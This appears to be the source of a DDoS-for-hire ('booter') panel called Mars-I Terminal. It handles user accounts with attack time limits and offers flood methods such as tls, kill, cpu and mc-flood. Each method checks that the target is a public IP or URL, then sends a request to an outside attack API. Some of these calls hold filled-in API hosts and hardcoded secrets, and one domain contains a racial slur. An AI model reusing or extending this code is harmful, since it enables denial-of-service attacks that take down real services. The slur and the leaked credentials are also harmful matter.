from files.networking.sender import send
from files.admin.controller import *
from files.logging.log import log
from files.termfx.handler.tfx import Reader
import time, threading
import ipaddress
import requests
ongoing = []
def validate_ip(ip):
    """ validate IP-address """
    if "https" in ip or "http" in ip: return True
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
def validate_port(port, rand=False):
    """ validate port number """
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time,maxt):
    """ validate attack duration """
    if int(time) > int(maxt): return False
    return time.isdigit() and int(time) >= 10 and int(time) <= 86400

def validate_size(size):
    """ validate buffer size """
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def conc(username,ip,port,method,tim):
    ongoing.append(f"[{username}] -> {ip}:{port} | {method} | {tim} Seconds")
    time.sleep(int(tim))
    ongoing.remove(f"[{username}] -> {ip}:{port} | {method} | {tim} Seconds")

def update_title(client, username):
    while 1:
        try:
            send(client, f'\33]0;Mars-I Terminal.  |  Connected as: {username}! | Network status: Online!\a', False)
            time.sleep(2)
        except:
            client.close()
def main_menu(socket, username, timelimit, cons, exp, ip):
    threading.Thread(target=update_title, args=[socket, username,]).start()
    tfx = Reader()
    tfx.user = username
    tfx.cons = cons
    tfx.expiry = exp
    tfx.ip = ip
    tfx.maxtime = timelimit
    tfx.register_dict({"username":username, "cons":cons, "maxtime":timelimit, "ip":ip})
    tfx.register_variable("clear", "[2J[1H[?25l[?25h[?0c")
    prompt = tfx.execute(open("assets/branding/prompt.tfx", "r", encoding="utf-8").read())
    banner = tfx.execute(open("assets/branding/main.tfx", "r", encoding="utf-8").read()).splitlines()
    for i in banner: send(socket, i)
    send(socket, prompt, escape=False)
    while 1:
        try:
            data = socket.recv(1024).decode().strip()
            if not data:
                continue
            args = data.split(' ')
            command = args[0]
            if command == "help" or command == "?":
                for i in tfx.execute(open("assets/branding/help.tfx", "r", encoding="utf-8").read()).splitlines():
                    send(socket, i)
            elif command == "client" and args[1] == "add":
                if username == "root" or username == "buzzed":
                    send(socket, "Username > ", False)
                    data = socket.recv(1024).decode().strip()
                    if not data:
                        continue
                    useradd=data
                    send(socket, "Password > ", False)
                    data = socket.recv(1024).decode().strip()
                    if not data:
                        continue
                    passadd=data
                    send(socket, "Cons > ", False)
                    data = socket.recv(1024).decode().strip()
                    if not data:
                        continue
                    consadd=data
                    send(socket, "Max Time > ", False)
                    data = socket.recv(1024).decode().strip()
                    if not data:
                        continue
                    timeadd=data
                    send(socket, "ExpDate(Ex: MM/DD/YYYY|99/99/9999) > ", False)
                    data = socket.recv(1024).decode().strip()
                    if not data:
                        send(socket, "ExpDate(Ex: MM/DD/YYYY|99/99/9999) > ", False)
                        data = socket.recv(1024).decode().strip()
                    expdd=data
                    open("assets/storage/db.txt", "a").write(f"\n{useradd} {passadd} {consadd} {timeadd} {expdd}\n")
                    send(socket, "(Mars-I) Added user to DB!")
            elif command == "exit":
                return
            elif command == "methods":
                for i in tfx.execute(open("assets/branding/pages.tfx", "r", encoding="utf-8").read()).splitlines():
                    send(socket, i)
            elif command == "wraith":
                for i in tfx.execute(open("assets/branding/wraith.tfx", "r", encoding="utf-8").read()).splitlines():
                    send(socket, i)
            elif command == "blaze":
                for i in tfx.execute(open("assets/branding/blaze.tfx", "r", encoding="utf-8").read()).splitlines():
                    send(socket, i)
            elif command == "status":
                for i in tfx.execute(open("assets/branding/status.tfx", "r", encoding="utf-8").read()).splitlines():
                    send(socket, i)
            elif command == "ongoing":
                send(socket, "Ongoing Aray:")
                for i in ongoing:
                    send(socket, i)
            elif command == "eclipse":
                for i in tfx.execute(open("assets/branding/eclipse.tfx", "r", encoding="utf-8").read()).splitlines():
                    send(socket, i)
            elif command == "funnel":
                for i in tfx.execute(open("assets/branding/funnel.tfx", "r", encoding="utf-8").read()).splitlines():
                    send(socket, i)
            elif command == "solar":
                for i in tfx.execute(open("assets/branding/solar.tfx", "r", encoding="utf-8").read()).splitlines():
                    send(socket, i)
            elif command == 'tls':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs,timelimit):
                                attk = Reader()
                                attk.register_dict({"target":ip, "port":port,"time":secs, "method":command, "username":username, "clear": "[2J[1H[?25l[?25h[?0c"})
                                requests.get(f"")
                                send(socket, "[2J[1H[?25l[?25h[?0c", False)
                                for i in attk.execute(open("assets/branding/sent.tfx", "r", encoding="utf-8").read()).splitlines(): send(socket, i)
                            else:
                                send(socket, 'Invalid attack duration!')
                        else:
                            send(socket, 'Invalid port number (1-65535)')
                    else:
                        send(socket, 'Invalid target address!')
                else:
                    send(socket, 'Usage: [METHOD] [IP/URL] [PORT] [TIME]')
            elif command == 'kill':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs,timelimit):
                                attk = Reader()
                                attk.register_dict({"target":ip, "port":port,"time":secs, "method":command, "username":username, "clear": "[2J[1H[?25l[?25h[?0c"})
                                requests.get(f"")
                                send(socket, "[2J[1H[?25l[?25h[?0c", False)
                                for i in attk.execute(open("assets/branding/sent.tfx", "r", encoding="utf-8").read()).splitlines(): send(socket, i)
                                threading.Thread(target=conc, args=[username,ip,port,command,secs,]).start()
                            else:
                                send(socket, 'Invalid attack duration!')
                        else:
                            send(socket, 'Invalid port number (1-65535)')
                    else:
                        send(socket, 'Invalid target address!')
                else:
                    send(socket, 'Usage: [METHOD] [IP/URL] [PORT] [TIME]')
            elif command == 'light':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs,timelimit):
                                attk = Reader()
                                attk.register_dict({"target":ip, "port":port,"time":secs, "method":command, "username":username, "clear": "[2J[1H[?25l[?25h[?0c"})
                                requests.get(f"")
                                send(socket, "[2J[1H[?25l[?25h[?0c", False)
                                for i in attk.execute(open("assets/branding/sent.tfx", "r", encoding="utf-8").read()).splitlines(): send(socket, i)
                                threading.Thread(target=conc, args=[username,ip,port,command,secs,]).start()
                            else:
                                send(socket, 'Invalid attack duration!')
                        else:
                            send(socket, 'Invalid port number (1-65535)')
                    else:
                        send(socket, 'Invalid target address!')
                else:
                    send(socket, 'Usage: [METHOD] [IP/URL] [PORT] [TIME]')
            elif command == 'cpu':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs,timelimit):
                                attk = Reader()
                                attk.register_dict({"target":ip, "port":port,"time":secs, "method":command, "username":username, "clear": "[2J[1H[?25l[?25h[?0c"})
                                requests.get(f"")
                                send(socket, "[2J[1H[?25l[?25h[?0c", False)
                                for i in attk.execute(open("assets/branding/sent.tfx", "r", encoding="utf-8").read()).splitlines(): send(socket, i)
                                threading.Thread(target=conc, args=[username,ip,port,command,secs,]).start()
                            else:
                                send(socket, 'Invalid attack duration!')
                        else:
                            send(socket, 'Invalid port number (1-65535)')
                    else:
                        send(socket, 'Invalid target address!')
                else:
                    send(socket, 'Usage: [METHOD] [IP/URL] [PORT] [TIME]')
            elif command == 'tls':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs,timelimit):
                                attk=Reader()
                                attk.register_dict({"target":ip, "port":port,"time":secs, "method":command, "username":username, "clear": "[2J[1H[?25l[?25h[?0c"})
                                requests.get(f"https://wraith.army/api/attack?username=n1x&secret=oiadyghasbcha&host={ip}&port={port}&time={secs}&method=SOCKET")
                                send(socket, "[2J[1H[?25l[?25h[?0c", False)
                                for i in attk.execute(open("assets/branding/sent.tfx", "r", encoding="utf-8").read()).splitlines(): send(socket, i)
                                threading.Thread(target=conc, args=[username,ip,port,command,secs,]).start()
                            else:
                                send(socket, 'Invalid attack duration!')
                        else:
                            send(socket, 'Invalid port number (1-65535)')
                    else:
                        send(socket, 'Invalid target address!')
                else:
                    send(socket, 'Usage: [METHOD] [IP/URL] [PORT] [TIME]')
            elif command == 'mc-connect':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs,timelimit):
                                attk = Reader()
                                attk.register_dict({"target":ip, "port":port,"time":secs, "method":command, "username":username, "clear": "[2J[1H[?25l[?25h[?0c"})
                                requests.get(f"https://tcphangniggers.lol/api/attack?username=Drown&secret=drownsec0x1&host={ip}&port={port}&time={secs}&method=MC-CONNECT")
                                send(socket, "[2J[1H[?25l[?25h[?0c", False)
                                for i in attk.execute(open("assets/branding/sent.tfx", "r", encoding="utf-8").read()).splitlines(): send(socket, i)
                                threading.Thread(target=conc, args=[username,ip,port,command,secs,]).start()
                            else:
                                send(socket, 'Invalid attack duration!')
                        else:
                            send(socket, 'Invalid port number (1-65535)')
                    else:
                        send(socket, 'Invalid target address!')
                else:
                    send(socket, 'Usage: [METHOD] [IP/URL] [PORT] [TIME]')
            elif command == 'mc-flood':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs,timelimit):
                                attk = Reader()
                                attk.register_dict({"target":ip, "port":port,"time":secs, "method":command, "username":username, "clear": "[2J[1H[?25l[?25h[?0c"})
                                requests.get(f"")
                                send(socket, "[2J[1H[?25l[?25h[?0c", False)
                                for i in attk.execute(open("assets/branding/sent.tfx", "r", encoding="utf-8").read()).splitlines(): send(socket, i)
                                threading.Thread(target=conc, args=[username,ip,port,command,secs,]).start()
                            else:
                                send(socket, 'Invalid attack duration!')
                        else:
                            send(socket, 'Invalid port number (1-65535)')
                    else:
                        send(socket, 'Invalid target address!')
                else:
                    send(socket, 'Usage: [METHOD] [IP/URL] [PORT] [TIME]')
            elif command == 'hold':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs,timelimit):
                                attk = Reader()
                                attk.register_dict({"target":ip, "port":port,"time":secs, "method":command, "username":username, "clear": "[2J[1H[?25l[?25h[?0c"})
                                meth=requests.get(f"").text
                                send(socket, "[2J[1H[?25l[?25h[?0c", False)
                                for i in attk.execute(open("assets/branding/sent.tfx", "r", encoding="utf-8").read()).splitlines(): send(socket, i)
                                threading.Thread(target=conc, args=[username,ip,port,command,secs,]).start()
                            else:
                                send(socket, 'Invalid attack duration!')
                        else:
                            send(socket, 'Invalid port number (1-65535)')
                    else:
                        send(socket, 'Invalid target address!')
                else:
                    send(socket, 'Usage: [METHOD] [IP/URL] [PORT] [TIME]')
            send(socket, prompt, escape=False)
        except:
            break